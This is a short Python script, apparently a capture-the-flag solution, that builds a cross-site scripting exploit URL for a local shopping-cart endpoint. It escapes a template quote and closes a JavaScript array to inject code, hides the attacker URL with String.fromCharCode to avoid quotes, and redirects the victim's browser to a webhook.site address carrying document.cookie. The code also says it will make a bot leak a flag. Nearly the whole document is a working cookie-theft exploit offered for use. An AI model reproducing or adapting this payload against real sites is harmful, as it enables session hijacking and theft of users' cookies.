import urllib.parse

# === CONFIGURATION ===
# REPLACE THIS with your actual webhook URL
WEBHOOK_URL = "https://webhook.site/192d4808-8834-4ffa-a0b2-fe8184af349b" 

def generate_robust_exploit(webhook_url):
    # 1. Convert Webhook URL to char codes to avoid quotes
    # Result: String.fromCharCode(104)+String.fromCharCode(116)...
    url_chars = "+".join([f"String.fromCharCode({ord(c)})" for c in webhook_url])
    
    # 2. Construct the JS Payload
    # logic: window.location = URL + "?" + encodeURIComponent(document.cookie)
    # We use String.fromCharCode(63) for "?" to avoid quotes.
    # We use encodeURIComponent to safely transmit special chars like ';' and ' '.
    js_payload = (
        f"window.location={url_chars}+"
        f"String.fromCharCode(63)+"
        f"encodeURIComponent(document.cookie)"
    )
    
    # 3. Build the Injection Item (Item 2)
    # ]; closes the array in the template
    # // comments out the rest of the line
    injection_item = f"];{js_payload}//"
    
    # 4. Build the 'items' parameter
    # Item 1: "\" (escapes the opening quote in the template)
    # Item 2: Our payload
    # The server splits by comma, so we join them with a comma here.
    items_param = f"\\,{injection_item}"
    
    # 5. Build the 'qty' parameter (Must match number of items: 2)
    qty_param = "1,1"
    
    # 6. construct final URL
    base_url = "http://127.0.0.1:32334/cart"
    qs = urllib.parse.urlencode({
        "items": items_param,
        "qty": qty_param
    })
    
    return f"{base_url}?{qs}"

if __name__ == "__main__":
    print("[-] Generating robust payload...")
    exploit_url = generate_robust_exploit(WEBHOOK_URL)
    
    print("\n[+] SUCCESS! Submit the URL below to the bot:")
    print("-" * 80)
    print(exploit_url)
    print("-" * 80)
    print("Check your webhook. You should see a GET request like:")
    print("/?flag=COSE354{...}")
